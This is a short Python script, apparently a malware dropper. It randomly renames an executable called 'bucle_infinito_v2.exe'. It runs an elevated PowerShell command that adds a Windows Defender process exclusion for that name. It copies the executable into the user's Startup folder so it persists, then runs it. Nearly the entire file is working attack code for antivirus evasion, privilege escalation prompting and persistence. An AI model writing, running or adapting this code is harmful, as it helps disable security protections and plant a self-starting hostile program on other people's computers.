import shutil
import subprocess
import os
import random
import string
import tempfile

archivo_origen = 'bucle_infinito_v2.exe'

# Generate a random string of length 8
random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
nombre_archivo_destino = f'il{random_string}.exe'

# Command to be executed
command2 = f"Add-MpPreference -ExclusionProcess '{nombre_archivo_destino}' -Force"


# Create a temporary PowerShell script
with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1', mode='w') as script_file:
    script_file.write(command2)
    script_path = script_file.name

# Construct the command to run the script as administrator
run_as_admin_command = f"powershell -Command \"& {{Start-Process powershell -Verb RunAs -ArgumentList '-File {script_path}'}}\""

# Execute the command
result = subprocess.run(run_as_admin_command, capture_output=True, text=True, shell=True)

# Clean up: Delete the temporary script
os.remove(script_path)

def copiar_y_ejecutar(archivo_origen, nombre_archivo_destino):
    # Obtener la ruta del escritorio del usuario
    # escritorio = os.path.join(os.path.expanduser('~'), 'Desktop')
    # Obtener la ruta de startup
    startup = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Ruta completa del destino
    # destino = os.path.join(escritorio, nombre_archivo_destino)
    destino2 = os.path.join(startup, nombre_archivo_destino)

    try:
        # Copiar el archivo
        # shutil.copy(archivo_origen, destino)
        shutil.copy(archivo_origen, destino2)

        # print(f"Archivo copiado a {destino}")
        print(f"Archivo copiado a {destino2}")

        # Ejecutar el archivo ejecutable
        subprocess.run([destino2])

    except Exception as e:
        print(f"Ocurrió un error: {e}")

copiar_y_ejecutar(archivo_origen, nombre_archivo_destino)
